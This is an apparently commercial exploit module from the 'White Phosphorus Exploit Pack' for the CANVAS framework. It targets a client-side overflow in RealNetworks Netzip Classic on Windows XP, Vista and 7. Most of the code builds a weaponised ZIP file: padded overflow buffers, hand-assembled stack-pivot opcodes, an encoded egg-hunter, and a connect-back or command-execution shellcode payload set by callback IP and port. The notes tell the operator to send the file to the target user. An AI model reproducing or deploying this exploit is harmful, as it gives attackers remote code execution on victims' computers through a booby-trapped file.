
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside


######################################################################################
NAME = "RealNetworks Netzip Classic Clientside Overflow"
DESCRIPTION = "A file format clientside overflow in Netzip Classic"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='RealNetworks'
DOCUMENTATION["Date public"] = "2011-01-30"
DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/16083/"
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION['CVE'] = "N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - run the module and send the created file to the target user.
Limited shellcode options due to size constraints.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "7", "Vista"]

NOTES="""
This is a client-side exploit - so run the module and send the created file
to the target user

WP> White Phosphorus Exploit Pack
WP> RealNetworks Netzip Classic Clientside Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Windows XP
1: Windows Vista
2: Windows 7

Payloads:
0: IE Inject Connect Back
1: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_real_netzip_classic/wp_real_netzip_classic.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows XP", (0x00000000), [WINALL]],
    1 : ["Windows Vista", (0x00000000), [WINALL]],
    2 : ["Windows 7", (0x00000000), [WIN7]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ######################################################################################
    PAYLOADS=["IE Inject Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.badstring = "\x00\x0a\x0d\x0f\x14\x15\x2f"
        self.encode_printable = True
        self.alignstack = True
        self.filename= "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".zip"
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def makefile(self):

        searchcode = wp_AlignStack() + wp_SearchCode(False)
        searchEncoded = self.wp_encodeShellcode(self.badstring, searchcode)
        
        if self.version == 1:
            buf1 = wp_randomstring(230) # Vista
        elif self.version == 2:
            buf1 = wp_randomstring(231) # 7
        else:
            buf1 = wp_randomstring(232) # XP
        buf1 += "\x59\x59\x40\x40"
        buf1 += pack('<L', 0x10057A41)
        buf1 += "\x01\x41"
        if self.version == 2:
            buf1 += "\x41"*2
            buf1 += "\x51" # push ecx
            buf1 += "\x5f" # pop edi
            buf1 += "\x04\x0E" # add al, OE
        else:
            buf1 += "\x41"*6
            buf1 += "\x51" # push ecx
            buf1 += "\x5f" # pop edi
            buf1 += "\x04\x11" # add al, 11
        buf1 += "\x03\x80" # add eax, edi
        buf1 += "\x50" # push eax
        buf1 += "\x5c" # pop esp
        buf1 += searchEncoded
        
        buf2 = 'c00kc00k'
        buf2 += "\x57" # push edi
        buf2 += "\x58" # pop eax
        buf2 += "\x04\x06" # add al, 6
        buf2 += "\x50" # push eax
        buf2 += "\x5c" # pop esp
        buf2 += self.shellcode
        
        payload = buf1 + wp_randomstring((4064 - len(buf1))) + ".txt"
        sc = buf2 + wp_randomstring((4064 - len(buf2))) + ".txt"
        
        filedata = "\x50\x4B\x03\x04\x14\x00\x00"
        filedata += "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
        filedata += "\x00\x00\x00\x00\x00\x00\x00\x00"
        filedata += "\xe4\x0f"
        filedata += "\x00\x00\x00"
        filedata += payload
        filedata += "\x50\x4B\x01\x02\x14\x00\x14"
        filedata += "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
        filedata += "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        filedata += "\xe4\x0f"
        filedata += "\x00\x00\x00\x00\x00\x00\x01\x00"
        filedata += "\x24\x00\x00\x00\x00\x00\x00\x00"
        filedata += payload
        filedata += "\x50\x4B\x01\x02\x14\x00\x14"
        filedata += "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
        filedata += "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        filedata += "\xe4\x0f"
        filedata += "\x00\x00\x00\x00\x00\x00\x01\x00"
        filedata += "\x24\x00\x00\x00\x00\x00\x00\x00"
        filedata += sc
        filedata += "\x50\x4B\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00"
        filedata += "\x24\x20\x00\x00"
        filedata += "\x02\x10\x00\x00"
        filedata += "\x00\x00"
        return filedata

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
